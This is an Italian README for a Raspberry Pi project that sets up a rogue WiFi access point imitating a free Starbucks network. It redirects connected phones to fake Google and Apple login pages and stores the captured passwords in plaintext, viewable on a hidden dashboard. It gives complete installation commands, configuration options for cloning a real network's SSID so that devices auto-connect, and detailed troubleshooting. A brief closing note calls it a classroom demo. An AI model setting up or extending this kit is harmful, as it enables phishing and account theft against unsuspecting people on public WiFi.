# Starbucks Captive Portal — Raspberry Pi (guida "da zero a funzionante")

Demo didattica di un captive portal: il Raspberry Pi crea una rete WiFi
"affiancata" alla rete libera esistente, dirotta i telefoni su un portale di
login finto (Google / Apple) e cattura le credenziali (file di testo +
dashboard `/sombra`). Al login il dispositivo viene **sbloccato sulla rete**
via iptables. **Solo per ambienti controllati e con consenso.**

## Architettura

```
 Internet
    |
 router WiFi libero (magari con captive portal del router)
    |
 [wlan0 STA]  Raspberry Pi 4 (2 GB)   <-- uplink WiFi, NIENTE ethernet
    |
 [ap0 AP]  rete "affiancata" (es. 10.3.0.0/24, SSID Starbucks_Free_WiFi)
    |
 telefono / laptop  -->  DNS dirottato sul Pi --> portale (app Express, porta 80)
```

Cosa gira sul Pi:

| Componente | Ruolo |
|---|---|
| `hostapd` | crea l'AP `ap0` (rete aperta, canale = canale dell'uplink, radio singola) |
| `dnsmasq` | DHCP + DNS su `ap0`: **ogni dominio risolve l'IP del Pi** (captive) |
| `app.js` (node) | portale su porta 80; host sconosciuti -> redirect a `/`; credenziali in `instance/creds.txt` + `/sombra`; al login sblocca il client via iptables |
| `iptables` | NAT `ap0 -> wlan0` + catena `PORTAL_CLIENTS` (default DROP; ACCEPT per IP al login) |
| `portal-passthrough.timer` | ogni 60s controlla che il router non ci tenga ancora bloccati col suo portale |

## Requisiti

- Raspberry Pi **4 da 2 GB** (ok anche 4/8 GB) con Raspberry Pi OS **Bookworm**
  (Lite va benissimo) — chip WiFi CYW43455: supporta AP+STA su radio singola.
- SD da almeno 16 GB, alimentatore ufficiale.
- Una rete WiFi libera (senza password) nel raggio d'azione.
- Un laptop per SSH e per le verifiche, un telefono per la demo.

## Installazione passo-passo

### 1. Flash del sistema

1. Scarica Raspberry Pi Imager e scegli **Raspberry Pi OS Lite (64-bit)**.
2. Prima di scrivere l'SD: ingranaggio -> **Enable SSH** e imposta utente/password.
3. Avvia il Pi, trova il suo IP (es. dall'interfaccia del router) e collega:

   ```bash
   ssh pi@<ip-del-pi>
   ```

### 2. Preparazione

```bash
sudo raspi-config          # -> Localisation -> Wireless LAN Country: imposta il tuo paese (regolatorio WiFi)
sudo apt update && sudo apt full-upgrade -y
sudo reboot
```

Collega il Pi alla rete libera (se non l'hai già fatto dal primo avvio) e
verifica che abbia Internet:

```bash
ping -c 3 1.1.1.1
```

> Se il router ha un captive portal (login email/password, Google/Apple), il
> Pi potrebbe non avere Internet finché non completi quel login: vai alla
> sezione **instruction.md** prima di continuare.

### 3. Copia il progetto sul Pi

Da questo repo (sul tuo PC):

```bash
rsync -av --exclude node_modules --exclude .git ./ pi@<ip-del-pi>:/opt/starbucks-portal/
```

oppure, se hai git:

```bash
ssh pi@<ip-del-pi> "git clone <url-del-repo> /opt/starbucks-portal"
```

### 4. Lancia il setup

```bash
cd /opt/starbucks-portal
sudo PORTAL_SSID="Starbucks_Free_WiFi" bash pi-portal/setup.sh
```

Spiegazione delle variabili principali:

| Variabile | Default | Cosa fa |
|---|---|---|
| `PORTAL_SSID` | `Starbucks_Free_WiFi` | nome della rete AP. **Usa lo stesso SSID della rete libera**: i telefoni già connessi in passato si agganciano da soli |
| `PORTAL_STA_SSID` | `= PORTAL_SSID` | SSID della rete libera a cui il Pi si aggancia (uplink) |
| `PORTAL_CHANNEL` | `auto` | canale AP; `auto` usa il canale dell'uplink (obbligatorio su radio singola) |
| `PORTAL_IP` | `10.3.0.1` | IP dell'AP |
| `PORTAL_WPA_PASSPHRASE` | (vuoto) | se impostata, l'AP è protetto WPA2 invece che aperto |
| `PORTAL_SKIP_APT` / `PORTAL_SKIP_DEPLOY` | `0` | `=1` per saltare installazione pacchetti / copia dell'app |

### 5. Se il router ha un captive portal

Se il login del router è a credenziali (email/password, Google/Apple), il Pi
resta senza Internet finché non completi quel login **manualmente**. Segui
`pi-portal/instruction.md`: login dal Pi (lynx/curl) o da un browser vero
attraverso l'AP del Pi.

### 6. Verifica finale

```bash
# dal laptop collegato alla rete del Pi
ping 10.3.0.1
curl -sI http://neverssl.com          # -> 302 verso http://10.3.0.1/
curl -s http://10.3.0.1/sombra -o /dev/null -w "%{http_code}"   # 302 (richiede login sombr4/sombr4)
```

1. Collega il telefono alla rete `Starbucks_Free_WiFi` (aperta).
2. Si deve aprire il portale (prova `http://neverssl.com` se non si apre da solo).
3. Completa il login con un account @gmail.com: il telefono viene sbloccato.
4. Controlla su `http://10.3.0.1/sombra` (login `sombr4` / `sombr4`) le
   credenziali catturate, e in `cat /opt/starbucks-portal/instance/creds.txt`.


## Varianti di configurazione

**Rete AP protetta WPA2** (utile se non vuoi che chiunque si agganci):

```bash
sudo PORTAL_WPA_PASSPHRASE="PasswordLungaAlmeno8Caratteri" bash pi-portal/setup.sh
```

**Canale forzato** (se il canale auto non va):

```bash
sudo PORTAL_CHANNEL=1 bash pi-portal/setup.sh
```

> Radio singola: l'AP deve stare **sullo stesso canale** dell'uplink. Se
> cambi canale a mano, cambialo anche sul router.

**Rete libera con password (WPA2)** per l'uplink STA: modifica
`/etc/wpa_supplicant/wpa_supplicant-wlan0.conf` aggiungendo
`psk="LaPassword"` nel blocco `network={...}`.

**5 GHz**: sostituisci `hw_mode=g` con `hw_mode=a` e `channel=36..165`
(richiede paese regolatorio impostato).

## Aggiornare l'app dopo una modifica al repo

```bash
cd /opt/starbucks-portal
rsync -av --exclude node_modules --exclude .git ./ pi@<ip-del-pi>:/opt/starbucks-portal/
ssh pi@<ip-del-pi> "cd /opt/starbucks-portal && npm install --omit=dev && sudo systemctl restart starbucks-portal"
```

## Comandi utili sul Pi

```bash
systemctl status starbucks-portal hostapd-portal dnsmasq create-ap0
journalctl -u starbucks-portal -f            # log del portale
journalctl -u portal-passthrough             # stato del captive portal del router
iptables -L PORTAL_CLIENTS -n --line-numbers # client bloccati/sbloccati
cat /opt/starbucks-portal/instance/creds.txt # log credenziali (JSON lines)
cat /tmp/portal-blocked 2>/dev/null          # presente = router ci tiene bloccati
```

## Troubleshooting (cause probabili con stima percentuale)

**Il telefono non vede la rete AP**
- hostapd non attivo (35%) — `systemctl status hostapd-portal`, `journalctl -u hostapd-portal`
- `ap0` non creato al boot (20%) — `ip link show ap0`; `systemctl restart create-ap0`
- canale AP diverso dall'uplink / canale occupato (15%) — prova `PORTAL_CHANNEL=1|6|11`
- paese regolatorio non impostato (15%) — `raspi-config` -> Wireless LAN Country
- telefono non aggiorna la lista reti (10%) — disattiva/riattiva il WiFi
- altro (5%)

**La rete appare ma il portale non si apre**
- dnsmasq non gira o non serve `ap0` (40%) — `journalctl -u dnsmasq`; `dig @10.3.0.1 example.com`
- browser/OS con cache del captive check (20%) — prova `http://neverssl.com` a mano
- l'app non è su porta 80 (15%) — `curl -sI http://10.3.0.1/`; `journalctl -u starbucks-portal`
- hostapd su canale sbagliato (10%) — vedi sopra
- IP statico/DHCP anomalo sul telefono (10%)
- altro (5%)

**Login completato ma niente internet sul telefono**
- **il Pi è ancora bloccato dal captive portal del router (45%)** — completa il
  login del router (instruction.md); `cat /tmp/portal-blocked`
- regola ACCEPT non inserita da grantNetwork (20%) — `iptables -L PORTAL_CLIENTS -n`;
  verifica `PORTAL_GRANT=1` in `/etc/starbucks-portal.env` e che `iptables` sia eseguibile
- NAT mancante (15%) — `iptables -t nat -L POSTROUTING`; riavvia con `netfilter-persistent restore`
- DNS del router che non risolve (10%)
- altro (10%)

**Le credenziali non compaiono su `/sombra`**
- app non riavviata dopo il deploy (30%) — `systemctl restart starbucks-portal`
- stai guardando la porta/IP sbagliato (25%) — la dashboard è `http://10.3.0.1/sombra`
- `instance/` non scrivibile (20%) — `ls -ld /opt/starbucks-portal/instance`; chown root
- browser su host conosciuto che non passa dal portale (15%)
- altro (10%)

**Su `/sombra` i campi DEV/BROWSER/MODEL sono vuoti ("?" o "—")**
- righe di `creds.txt` scritte prima dell'aggiornamento (70%) — non
  contengono `browser`/`model`; le nuove catture li riempiono, oppure cancella
  le righe vecchie e riavvia il servizio
- app non aggiornata o non riavviata (20%) — `systemctl restart starbucks-portal`
- altro (10%)

**Prestazioni pessime / rete lenta**
- canale 2.4 GHz congestionato (60%) — canale 1/6/11 meno affollato
- distanza/interferenze (25%)
- troppi client sulla stessa radio (10%)
- altro (5%)

**Dopo il deploy su Render (o altro host) il sito reindirizza a 127.0.0.1
o ERR_CONNECTION_REFUSED**
- codice vecchio senza il gate `PORTAL_ENABLED` (90%) — il fallback
  captive gira solo se `PORTAL_ENABLED=1`; ri-push e ridistribuisci
  l'ultimo commit: su Render non va mai impostato
- `PORTAL_ENABLED=1` presente per errore anche su Render (10%) — rimuovilo
  dalle variabili d'ambiente (il fallback è riservato al Pi, dove
  `setup.sh` lo scrive in `/etc/starbucks-portal.env`)

## Nota etica e legale

Progetto **didattico**: cattura di credenziali senza consenso è reato in quasi
tutti i paesi. Usalo solo in ambienti che controlli, con persone informate, o
in laboratori di cybersecurity autorizzati. La versione "reale" di un
captive portal deve cifrare tutto (HTTPS) e non memorizzare password in
chiaro: qui le password in chiaro sono **volutamente** parte della demo.

